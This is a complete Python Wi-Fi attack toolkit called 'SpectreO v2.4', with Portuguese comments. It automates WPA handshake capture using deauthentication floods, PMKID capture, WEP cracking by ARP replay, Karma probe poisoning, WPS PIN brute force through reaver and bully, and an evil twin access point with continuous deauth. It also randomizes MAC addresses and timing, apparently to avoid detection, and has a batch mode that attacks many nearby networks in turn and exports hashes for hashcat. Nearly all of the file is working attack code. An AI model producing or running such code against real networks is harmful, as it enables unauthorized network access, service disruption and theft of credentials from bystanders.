#!/usr/bin/env python3
"""
SpectreO v2.4 FINAL - Production Grade Complete

Hardware target: Aspire 3 15 (8GB RAM, 100GB disco)

6 Ataques Completos:
✓ 1. Handshake WPA/WPA2 (com channel monitor + thread-safe)
✓ 2. PMKID (com MAC randomizado)
✓ 3. WEP Cracking (com ARP injection + IV monitor)
✓ 4. Karma Attack (probe poisoning)
✓ 5. WPS PIN (Reaver + Bully fallback)
✓ 6. Evil Twin SEM Portal (com validação hostapd)

Melhorias v2.4:
✓ Safe sendp wrapper (interface disconnect handling)
✓ Channel monitoring (AP hop detection)
✓ Race conditions eliminadas (CaptureState thread-safe)
✓ Batch inteligente com meta de capturas
✓ Cores via rich library
✓ Error recovery completo
✓ Export hashcat automático (.hc22000, .hc16800)
"""

import os
import sys
import time
import json
import gzip
import random
import subprocess
import threading
from scapy.all import *
from collections import defaultdict
from datetime import datetime

# Rich para cores
try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, TextColumn
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False
    console = None

# ============================================================================
# CONFIGURAÇÃO
# ============================================================================

CONFIG = {
    'interface': 'wlan0',
    'output_dir': 'captures',
    'compress': True,
    'skip_captured': True,
    'optimize_live': True,
    'scan_duration': 30,
    'max_capture_attempts': 5,
    'capture_timeout': 30,
    'batch_mode': False,
    'batch_max_targets': 20,
    'batch_min_clients': 0,
    'batch_min_signal': -80,
    'batch_target_captures': None,
    'mac_rotation': True,
    'timing_randomization': True,
    'detect_countermeasures': True,
    'auto_export_hashcat': True,
    'aggressive_deauth': True,
    'verbose': True,
    'monitor_channel_changes': True
}

# ============================================================================
# LOGGER COM CORES
# ============================================================================

class ColoredLogger:
    @staticmethod
    def debug(msg):
        if CONFIG['verbose']:
            timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
            if RICH_AVAILABLE:
                console.print(f"[dim cyan][DEBUG] {timestamp}[/dim cyan] [dim]{msg}[/dim]")
            else:
                print(f"[DEBUG] {timestamp} | {msg}")
    
    @staticmethod
    def info(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[blue][INFO][/blue]  {timestamp} | {msg}")
        else:
            print(f"[INFO]  {timestamp} | {msg}")
    
    @staticmethod
    def success(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold green][+++][/bold green]   {timestamp} | {msg}")
        else:
            print(f"[+++]   {timestamp} | {msg}")
    
    @staticmethod
    def warning(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold yellow][!][/bold yellow]     {timestamp} | {msg}")
        else:
            print(f"[!]     {timestamp} | {msg}")
    
    @staticmethod
    def error(msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if RICH_AVAILABLE:
            console.print(f"[bold red][-][/bold red]     {timestamp} | {msg}")
        else:
            print(f"[-]     {timestamp} | {msg}")

log = ColoredLogger()

# ============================================================================
# SAFE NETWORK OPERATIONS
# ============================================================================

class SafeNetOps:
    @staticmethod
    def safe_sendp(packet, iface, **kwargs):
        try:
            sendp(packet, iface=iface, **kwargs)
            return True
        except OSError as e:
            if 'No such device' in str(e) or 'Network is down' in str(e):
                log.error(f"Interface {iface} offline!")
                return False
            else:
                log.error(f"Erro: {e}")
                return False
        except Exception as e:
            log.error(f"Erro inesperado: {e}")
            return False
    
    @staticmethod
    def check_interface_exists(interface):
        try:
            result = subprocess.run(['ip', 'link', 'show', interface],
                                   capture_output=True, stderr=subprocess.DEVNULL)
            return result.returncode == 0
        except:
            return False

# ============================================================================
# CHANNEL MONITOR
# ============================================================================

class ChannelMonitor:
    def __init__(self, bssid, initial_channel, interface):
        self.bssid = bssid
        self.current_channel = initial_channel
        self.interface = interface
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
    
    def start(self):
        self.thread = threading.Thread(target=self._monitor, daemon=True)
        self.thread.start()
        log.debug(f"Channel monitor: {self.bssid}")
    
    def stop(self):
        self.stop_event.set()
        if hasattr(self, 'thread'):
            self.thread.join(timeout=2)
    
    def get_channel(self):
        with self.lock:
            return self.current_channel
    
    def _monitor(self):
        def handler(pkt):
            if pkt.haslayer(Dot11Beacon) and pkt[Dot11].addr2 == self.bssid:
                try:
                    channel = int(ord(pkt[Dot11Elt:3].info))
                    with self.lock:
                        if channel != self.current_channel:
                            log.warning(f"AP mudou canal {self.current_channel} → {channel}")
                            self.current_channel = channel
                except:
                    pass
        
        sniff(iface=self.interface, prn=handler, timeout=60, 
              stop_filter=lambda x: self.stop_event.is_set(), store=False)

# ============================================================================
# CAPTURE STATE (Thread-Safe)
# ============================================================================

class CaptureState:
    def __init__(self):
        self.packets = []
        self.captured = False
        self.lock = threading.Lock()
    
    def add_packet(self, pkt):
        with self.lock:
            self.packets.append(pkt)
    
    def get_packets(self):
        with self.lock:
            return self.packets.copy()
    
    def set_captured(self, value):
        with self.lock:
            self.captured = value
    
    def is_captured(self):
        with self.lock:
            return self.captured
    
    def packet_count(self):
        with self.lock:
            return len(self.packets)

# ============================================================================
# GERENCIADOR + VALIDATOR + DETECTOR
# ============================================================================

class CaptureManager:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.cap_dir = os.path.join(output_dir, 'cap_files')
        self.hashcat_dir = os.path.join(output_dir, 'hashcat_files')
        self.metadata_file = os.path.join(output_dir, 'captures.json')
        self.captured = self.load_metadata()
        
        os.makedirs(self.cap_dir, exist_ok=True)
        os.makedirs(self.hashcat_dir, exist_ok=True)
        
        log.info(f"Estrutura: {output_dir}/")
        log.debug(f"  ├─ captures.json")
        log.debug(f"  ├─ cap_files/")
        log.debug(f"  └─ hashcat_files/")
    
    def load_metadata(self):
        if os.path.exists(self.metadata_file):
            try:
                with open(self.metadata_file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def save_metadata(self):
        try:
            with open(self.metadata_file, 'w') as f:
                json.dump(self.captured, f, indent=2, sort_keys=True)
        except Exception as e:
            log.error(f"Erro salvar: {e}")
    
    def is_captured(self, bssid):
        return bssid in self.captured
    
    def add_capture(self, bssid, ssid, attack_type, cap_file, hc_file, channel, signal, validation=None):
        self.captured[bssid] = {
            'ssid': ssid,
            'attack_type': attack_type,
            'cap_file': cap_file,
            'hashcat_file': hc_file,
            'channel': channel,
            'signal': signal,
            'timestamp': datetime.now().isoformat(),
            'validation': validation if validation else {}
        }
        self.save_metadata()

class CaptureValidator:
    @staticmethod
    def validate_handshake(packets):
        eapol_frames = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
        
        if len(eapol_frames) < 4:
            return False, f"Apenas {len(eapol_frames)}/4"
        
        has_msg1 = has_msg2 = False
        anonce = snonce = mic = None
        
        for pkt in eapol_frames:
            try:
                raw = bytes(pkt[EAPOL])
                if len(raw) < 99:
                    continue
                
                current_anonce = raw[17:49]
                current_snonce = raw[49:81] if len(raw) > 81 else None
                current_mic = raw[81:97] if len(raw) > 96 else None
                
                if current_anonce != b'\x00' * 32 and (not current_snonce or current_snonce == b'\x00' * 32):
                    has_msg1 = True
                    anonce = current_anonce
                
                if current_snonce and current_snonce != b'\x00' * 32 and current_mic:
                    has_msg2 = True
                    snonce = current_snonce
                    mic = current_mic
            except:
                continue
        
        if not (has_msg1 and has_msg2):
            return False, "Messages ausentes"
        if not anonce or anonce == b'\x00' * 32:
            return False, "ANonce inválido"
        if not snonce or snonce == b'\x00' * 32:
            return False, "SNonce inválido"
        if not mic or mic == b'\x00' * 16:
            return False, "MIC inválido"
        
        return True, {
            'anonce': anonce.hex()[:32],
            'snonce': snonce.hex()[:32],
            'mic': mic.hex()[:32],
            'frames': len(eapol_frames)
        }
    
    @staticmethod
    def validate_pmkid(packets):
        for pkt in packets:
            if pkt.haslayer(EAPOL):
                try:
                    raw = bytes(pkt[EAPOL])
                    if b'\xdd' in raw:
                        idx = raw.find(b'\xdd')
                        if len(raw) >= idx + 22:
                            pmkid = raw[idx+2:idx+18]
                            if pmkid != b'\x00' * 16:
                                return True, {'pmkid': pmkid.hex()}
                except:
                    pass
        return False, "Não encontrado"

class CountermeasureDetector:
    def __init__(self):
        self.deauth_times = []
        self.blocked = False
    
    def record_deauth(self):
        self.deauth_times.append(time.time())
        cutoff = time.time() - 60
        self.deauth_times = [t for t in self.deauth_times if t > cutoff]
    
    def check_rate_limit(self):
        if len(self.deauth_times) > 150:
            self.blocked = True
            return True
        return False
    
    def reset(self):
        self.deauth_times = []
        self.blocked = False

# ============================================================================
# UTILS
# ============================================================================

def export_to_hashcat(cap_file, attack_type, manager):
    if not CONFIG['auto_export_hashcat']:
        return None
    
    try:
        basename = os.path.basename(cap_file).replace('.cap.gz', '').replace('.cap', '')
        
        if attack_type == 'handshake':
            output = os.path.join(manager.hashcat_dir, f"{basename}.hc22000")
            result = subprocess.run(['hcxpcapngtool', '-o', output, cap_file],
                                   capture_output=True, timeout=10)
            if result.returncode == 0 and os.path.exists(output):
                log.success(f"Export: {output}")
                return output
        
        elif attack_type == 'pmkid':
            output = os.path.join(manager.hashcat_dir, f"{basename}.hc16800")
            result = subprocess.run(['hcxpcapngtool', '-o', output, cap_file],
                                   capture_output=True, timeout=10)
            if result.returncode == 0 and os.path.exists(output):
                log.success(f"Export: {output}")
                return output
    
    except FileNotFoundError:
        log.warning("hcxpcapngtool não encontrado")
    except:
        pass
    
    return None

def rotate_mac(interface):
    if not CONFIG['mac_rotation']:
        return None
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    
    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                      check=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                      check=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                      check=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        
        log.info(f"MAC: {new_mac}")
        return new_mac
    except:
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                          timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        return None

def optimize_system():
    if not CONFIG['optimize_live']:
        return
    
    log.info("Otimizando...")
    subprocess.run(['sysctl', '-w', 'vm.swappiness=0'], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sync'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    for svc in ['NetworkManager', 'wpa_supplicant']:
        subprocess.run(['systemctl', 'stop', svc], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        os.nice(-20)
    except:
        pass
    
    log.success("Otimizado")

def setup_interface(interface):
    log.info(f"Setup {interface}...")
    
    subprocess.run(['airmon-ng', 'check', 'kill'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    
    subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'monitor', 'control'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'txpower', 'fixed', '30'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'power_save', 'off'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    log.success(f"Interface OK (MAC: {new_mac})")

def set_channel(interface, channel):
    subprocess.run(['iw', interface, 'set', 'channel', str(channel)], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan(interface, duration=30):
    networks = {}
    clients = defaultdict(list)
    traffic = defaultdict(int)
    
    log.info(f"Scan {duration}s...")
    
    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                channel = int(ord(pkt[Dot11Elt:3].info))
                stats = pkt[Dot11Beacon].network_stats()
                crypto = stats.get('crypto', set())
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
                
                if bssid not in networks:
                    networks[bssid] = {
                        'ssid': ssid if ssid else '<HIDDEN>',
                        'channel': channel,
                        'signal': signal,
                        'crypto': crypto
                    }
            except:
                pass
        
        elif pkt.haslayer(Dot11) and pkt.type == 2:
            for bssid in list(networks.keys()):
                if pkt.addr1 == bssid or pkt.addr2 == bssid:
                    client = pkt.addr2 if pkt.addr1 == bssid else pkt.addr1
                    if client != bssid and client not in clients[bssid]:
                        clients[bssid].append(client)
                    traffic[bssid] += 1
    
    stop = threading.Event()
    
    def hop():
        channels = list(range(1, 14))
        while not stop.is_set():
            for ch in channels:
                if stop.is_set():
                    break
                set_channel(interface, ch)
                time.sleep(0.15)
    
    hopper = threading.Thread(target=hop, daemon=True)
    hopper.start()
    
    sniff(iface=interface, prn=handler, timeout=duration, store=False)
    
    stop.set()
    hopper.join()
    
    for bssid in networks:
        networks[bssid]['clients'] = clients.get(bssid, [])
        networks[bssid]['traffic'] = traffic.get(bssid, 0)
    
    log.success(f"Scan: {len(networks)} redes")
    return networks

# ============================================================================
# ATAQUES (1-6)
# ============================================================================

def attack_handshake(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 1: Handshake WPA/WPA2")
    log.info("="*70)
    log.info(f"Alvo: {target['ssid']} ({target['bssid']})")
    
    if not SafeNetOps.check_interface_exists(interface):
        return False
    
    if CONFIG['mac_rotation']:
        rotate_mac(interface)
        time.sleep(1)
    
    set_channel(interface, target['channel'])
    time.sleep(1)
    
    channel_monitor = ChannelMonitor(target['bssid'], target['channel'], interface) if CONFIG['monitor_channel_changes'] else None
    if channel_monitor:
        channel_monitor.start()
    
    for attempt in range(1, CONFIG['max_capture_attempts'] + 1):
        log.info(f"Tentativa {attempt}/{CONFIG['max_capture_attempts']}")
        
        state = CaptureState()
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    state.add_packet(pkt)
                    if state.packet_count() >= 4:
                        valid, _ = CaptureValidator.validate_handshake(state.get_packets())
                        if valid:
                            state.set_captured(True)
                            return True
        
        done = threading.Event()
        
        def sniff_thread():
            sniff(iface=interface, prn=handler, timeout=CONFIG['capture_timeout'], 
                  stop_filter=lambda x: state.is_captured(), store=False)
            done.set()
        
        sniffer = threading.Thread(target=sniff_thread, daemon=True)
        sniffer.start()
        
        time.sleep(1)
        
        inter = random.uniform(0.03, 0.10) if CONFIG['timing_randomization'] else 0.05
        rounds = 7 if CONFIG['aggressive_deauth'] else 3
        count = 40 if CONFIG['aggressive_deauth'] else 20
        
        for round_num in range(1, rounds + 1):
            if channel_monitor:
                current_ch = channel_monitor.get_channel()
                if current_ch != target['channel']:
                    set_channel(interface, current_ch)
                    target['channel'] = current_ch
            
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            SafeNetOps.safe_sendp(frame, interface, count=count, inter=inter, verbose=0)
            detector.record_deauth()
            
            if target['clients']:
                for client in target['clients'][:5]:
                    f1 = RadioTap()/Dot11(addr1=client, addr2=target['bssid'], 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    f2 = RadioTap()/Dot11(addr1=target['bssid'], addr2=client, 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    SafeNetOps.safe_sendp([f1, f2], interface, count=count//2, inter=inter, verbose=0)
                    detector.record_deauth()
            
            time.sleep(random.uniform(0.2, 0.5) if CONFIG['timing_randomization'] else 0.3)
        
        done.wait()
        
        if state.is_captured():
            valid, result = CaptureValidator.validate_handshake(state.get_packets())
            
            if valid:
                filename_base = f"hs_{target['bssid'].replace(':', '')}_{target['ssid'].replace(' ', '_')[:15]}"
                
                if CONFIG['compress']:
                    cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap.gz")
                    with gzip.open(cap_file, 'wb') as f:
                        wrpcap(f, state.get_packets())
                else:
                    cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
                    wrpcap(cap_file, state.get_packets())
                
                hc_file = export_to_hashcat(cap_file, 'handshake', manager)
                manager.add_capture(target['bssid'], target['ssid'], 'handshake',
                                   cap_file, hc_file, target['channel'], target['signal'], result)
                
                log.success("HANDSHAKE CAPTURADO")
                
                if channel_monitor:
                    channel_monitor.stop()
                
                return True
        
        if attempt < CONFIG['max_capture_attempts']:
            time.sleep(3)
    
    if channel_monitor:
        channel_monitor.stop()
    
    return False

def attack_pmkid(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 2: PMKID")
    log.info("="*70)
    
    if CONFIG['mac_rotation']:
        rotate_mac(interface)
        time.sleep(1)
    
    set_channel(interface, target['channel'])
    
    for attempt in range(1, 10):
        pmkid_packets = []
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    pmkid_packets.append(pkt)
        
        fake_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
        
        for i in range(5):
            assoc = RadioTap()/Dot11(addr1=target['bssid'], addr2=fake_mac, 
                                     addr3=target['bssid'])/Dot11AssoReq()
            sendp(assoc, iface=interface, verbose=0)
            time.sleep(0.3)
        
        sniff(iface=interface, prn=handler, timeout=15, store=False)
        
        if pmkid_packets:
            valid, result = CaptureValidator.validate_pmkid(pmkid_packets)
            if valid:
                filename_base = f"pmkid_{target['bssid'].replace(':', '')}_{target['ssid'].replace(' ', '_')[:15]}"
                cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
                wrpcap(cap_file, pmkid_packets)
                
                hc_file = export_to_hashcat(cap_file, 'pmkid', manager)
                manager.add_capture(target['bssid'], target['ssid'], 'pmkid',
                                   cap_file, hc_file, target['channel'], target['signal'], result)
                
                log.success("PMKID CAPTURADO")
                return True
    
    return False

def attack_wep(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 3: WEP com ARP Injection")
    log.info("="*70)
    
    if 'WEP' not in str(target['crypto']):
        log.error("Não é WEP")
        return False
    
    set_channel(interface, target['channel'])
    output_base = f"wep_{target['bssid'].replace(':', '')}"
    output = os.path.join(manager.cap_dir, output_base)
    
    airodump_proc = subprocess.Popen(['airodump-ng', '-c', str(target['channel']), 
                                     '--bssid', target['bssid'], '-w', output, 
                                     '--output-format', 'cap', interface],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(3)
    
    aireplay_proc = None
    if target['clients']:
        client_mac = target['clients'][0]
        aireplay_proc = subprocess.Popen(['aireplay-ng', '--arpreplay', 
                                         '-b', target['bssid'], '-h', client_mac, interface],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    log.info("Coletando IVs (até 10min)...")
    start_time = time.time()
    
    while time.time() - start_time < 600:
        cap_file = f"{output}-01.cap"
        if os.path.exists(cap_file):
            try:
                pkts = rdpcap(cap_file)
                if len(pkts) >= 50000:
                    log.success("50k IVs!")
                    break
            except:
                pass
        time.sleep(10)
    
    airodump_proc.kill()
    if aireplay_proc:
        aireplay_proc.kill()
    
    cap_file = f"{output}-01.cap"
    if os.path.exists(cap_file):
        result = subprocess.run(['aircrack-ng', cap_file],
                               capture_output=True, text=True, timeout=60)
        
        if 'KEY FOUND!' in result.stdout:
            log.success("WEP CRACKEADO!")
            manager.add_capture(target['bssid'], target['ssid'], 'wep',
                               cap_file, None, target['channel'], target['signal'], {})
            return True
    
    return False

def attack_karma(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 4: Karma (Probe Poisoning)")
    log.info("="*70)
    
    captured_probes = set()
    
    def handler(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                client_mac = pkt[Dot11].addr2
                
                if ssid and ssid not in captured_probes:
                    captured_probes.add(ssid)
                    log.success(f"Probe: {client_mac} -> '{ssid}'")
                    
                    response = RadioTap()/Dot11(type=0, subtype=8, addr1=client_mac, 
                                               addr2=interface, addr3=interface)/\
                              Dot11Beacon(cap='ESS')/Dot11Elt(ID='SSID', info=ssid)
                    sendp(response, iface=interface, verbose=0)
            except:
                pass
    
    try:
        sniff(iface=interface, prn=handler, store=False, timeout=120)
    except KeyboardInterrupt:
        pass
    
    log.info(f"{len(captured_probes)} SSIDs")
    return False

def attack_wps(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 5: WPS PIN (Reaver + Bully)")
    log.info("="*70)
    
    try:
        result = subprocess.run(['wash', '-i', interface, '-C'], 
                               capture_output=True, text=True, timeout=10)
        
        if target['bssid'] not in result.stdout:
            log.error("WPS não detectado")
            return False
        
        log.success("WPS detectado")
        
        # Reaver Pixie
        try:
            reaver_result = subprocess.run(['reaver', '-i', interface, '-b', target['bssid'], 
                                           '-c', str(target['channel']), '-K', '1', '-vv'], 
                                          capture_output=True, text=True, timeout=300)
            
            if 'WPS PIN:' in reaver_result.stdout:
                log.success("Reaver Pixie SUCESSO")
                return True
        except subprocess.TimeoutExpired:
            pass
        
        # Bully fallback
        try:
            bully_result = subprocess.run(['bully', interface, '-b', target['bssid'], 
                                          '-c', str(target['channel']), '-d'], 
                                         capture_output=True, text=True, timeout=300)
            
            if 'PIN:' in bully_result.stdout:
                log.success("Bully Pixie SUCESSO")
                return True
        except:
            pass
    
    except Exception as e:
        log.error(f"Erro WPS: {e}")
    
    return False

def attack_evil_twin_no_portal(target, interface, manager, detector):
    log.info("="*70)
    log.info("ATAQUE 6: Evil Twin SEM Portal")
    log.info("="*70)
    
    hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={target['ssid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=0
"""
    
    hostapd_conf_file = '/tmp/hostapd_evil.conf'
    with open(hostapd_conf_file, 'w') as f:
        f.write(hostapd_conf)
    
    hostapd_proc = subprocess.Popen(['hostapd', hostapd_conf_file],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(3)
    log.success("AP falso ativo")
    
    stop_deauth = threading.Event()
    
    def continuous_deauth():
        while not stop_deauth.is_set():
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            sendp(frame, iface=interface, count=5, inter=0.5, verbose=0)
            time.sleep(2)
    
    deauth_thread = threading.Thread(target=continuous_deauth, daemon=True)
    deauth_thread.start()
    
    state = CaptureState()
    
    def handler(pkt):
        if pkt.haslayer(EAPOL):
            state.add_packet(pkt)
            if state.packet_count() >= 4:
                valid, _ = CaptureValidator.validate_handshake(state.get_packets())
                if valid:
                    state.set_captured(True)
                    return True
    
    try:
        sniff(iface=interface, prn=handler, timeout=300, 
              stop_filter=lambda x: state.is_captured(), store=False)
    except KeyboardInterrupt:
        pass
    
    stop_deauth.set()
    hostapd_proc.kill()
    
    if state.is_captured():
        valid, result = CaptureValidator.validate_handshake(state.get_packets())
        
        if valid:
            filename_base = f"evil_{target['bssid'].replace(':', '')}_{target['ssid'].replace(' ', '_')[:15]}"
            cap_file = os.path.join(manager.cap_dir, f"{filename_base}.cap")
            wrpcap(cap_file, state.get_packets())
            
            hc_file = export_to_hashcat(cap_file, 'handshake', manager)
            manager.add_capture(target['bssid'], target['ssid'], 'evil_twin',
                               cap_file, hc_file, target['channel'], target['signal'], result)
            
            log.success("HANDSHAKE via Evil Twin")
            return True
    
    return False

# ============================================================================
# BATCH INTELIGENTE
# ============================================================================

def batch_mode_intelligent(targets, interface, manager, detector):
    log.info("="*70)
    log.info("MODO BATCH INTELIGENTE")
    log.info("="*70)
    
    filtered = [(b, i) for b, i in targets 
                if len(i['clients']) >= CONFIG['batch_min_clients'] 
                and i['signal'] >= CONFIG['batch_min_signal']][:CONFIG['batch_max_targets']]
    
    success = 0
    stats = {'handshake': 0, 'pmkid': 0, 'wep': 0, 'wps': 0, 'failed': 0}
    
    for idx, (bssid, info) in enumerate(filtered, 1):
        target = {**info, 'bssid': bssid}
        crypto_str = ', '.join(str(c) for c in target['crypto']) if target['crypto'] else 'OPEN'
        
        log.info(f"\n[{idx}/{len(filtered)}] {target['ssid']} - {crypto_str}")
        
        result = False
        
        # WEP
        if 'WEP' in str(target['crypto']):
            result = attack_wep(target, interface, manager, detector)
            if result:
                stats['wep'] += 1
                success += 1
        
        # WPS
        elif 'WPS' in str(target['crypto']):
            result = attack_wps(target, interface, manager, detector)
            if result:
                stats['wps'] += 1
                success += 1
            else:
                result = attack_handshake(target, interface, manager, detector)
                if result:
                    stats['handshake'] += 1
                    success += 1
                else:
                    result = attack_pmkid(target, interface, manager, detector)
                    if result:
                        stats['pmkid'] += 1
                        success += 1
        
        # WPA/WPA2
        elif 'WPA' in str(target['crypto']) or 'WPA2' in str(target['crypto']):
            result = attack_handshake(target, interface, manager, detector)
            if result:
                stats['handshake'] += 1
                success += 1
            else:
                result = attack_pmkid(target, interface, manager, detector)
                if result:
                    stats['pmkid'] += 1
                    success += 1
        
        if not result:
            stats['failed'] += 1
        
        if CONFIG['batch_target_captures'] and success >= CONFIG['batch_target_captures']:
            log.success(f"Meta atingida: {CONFIG['batch_target_captures']}")
            break
        
        if idx < len(filtered):
            time.sleep(5)
    
    log.info("\n" + "="*70)
    log.success("BATCH COMPLETO")
    log.info(f"Sucessos: {success}/{len(filtered)}")
    log.info(f"Handshake: {stats['handshake']}, PMKID: {stats['pmkid']}, WEP: {stats['wep']}, WPS: {stats['wps']}")

# ============================================================================
# MENU + MAIN
# ============================================================================

ATTACKS = {
    '1': {'name': 'Handshake WPA/WPA2', 'func': attack_handshake},
    '2': {'name': 'PMKID', 'func': attack_pmkid},
    '3': {'name': 'WEP com ARP Injection', 'func': attack_wep},
    '4': {'name': 'Karma Attack', 'func': attack_karma},
    '5': {'name': 'WPS PIN (Reaver + Bully)', 'func': attack_wps},
    '6': {'name': 'Evil Twin SEM Portal', 'func': attack_evil_twin_no_portal},
    'B': {'name': 'BATCH INTELIGENTE', 'func': None}
}

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║              SpectreO v2.4 FINAL - Complete                  ║
╠══════════════════════════════════════════════════════════════╣
║  6 Ataques:                                                  ║
║    1. Handshake WPA/WPA2                                     ║
║    2. PMKID                                                  ║
║    3. WEP Cracking (ARP Injection)                           ║
║    4. Karma Attack                                           ║
║    5. WPS PIN (Reaver + Bully)                               ║
║    6. Evil Twin (SEM Portal)                                 ║
║    B. Batch Inteligente                                      ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    if os.geteuid() != 0:
        log.error("ROOT REQUIRED")
        sys.exit(1)
    
    optimize_system()
    manager = CaptureManager(CONFIG['output_dir'])
    detector = CountermeasureDetector()
    interface = CONFIG['interface']
    setup_interface(interface)
    time.sleep(2)
    
    networks = scan(interface, duration=CONFIG['scan_duration'])
    
    if not networks:
        log.error("Nenhuma rede")
        return
    
    available = {b: i for b, i in networks.items() 
                 if not (CONFIG['skip_captured'] and manager.is_captured(b))}
    
    targets = sorted(available.items(), 
                    key=lambda x: (len(x[1]['clients']), x[1]['signal']), 
                    reverse=True)
    
    log.info(f"{len(targets)} alvos:\n")
    for i, (bssid, info) in enumerate(targets, 1):
        crypto = ', '.join(str(c) for c in info['crypto']) if info['crypto'] else 'OPEN'
        print(f"{i:2}. {info['ssid'][:20]:20} | {bssid} | Ch{info['channel']:2} | {info['signal']:4}dBm | {len(info['clients'])}cli | {crypto}")
    
    mode = input("\n[?] (I)nterativo ou (B)atch: ").strip().upper()
    
    if mode == 'B':
        batch_mode_intelligent(targets, interface, manager, detector)
    else:
        choice = int(input("\n[?] Alvo: ")) - 1
        bssid, info = targets[choice]
        target = {**info, 'bssid': bssid}
        
        print(f"\n{'='*70}\nATAQUES\n{'='*70}\n")
        for key, attack in ATTACKS.items():
            if attack['func']:
                print(f"{key}. {attack['name']}")
        
        atk = input("\n[?] Ataque: ").strip()
        if atk in ATTACKS and ATTACKS[atk]['func']:
            ATTACKS[atk]['func'](target, interface, manager, detector)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.warning("Interrompido")
    except Exception as e:
        log.error(f"Erro: {e}")
        import traceback
        traceback.print_exc()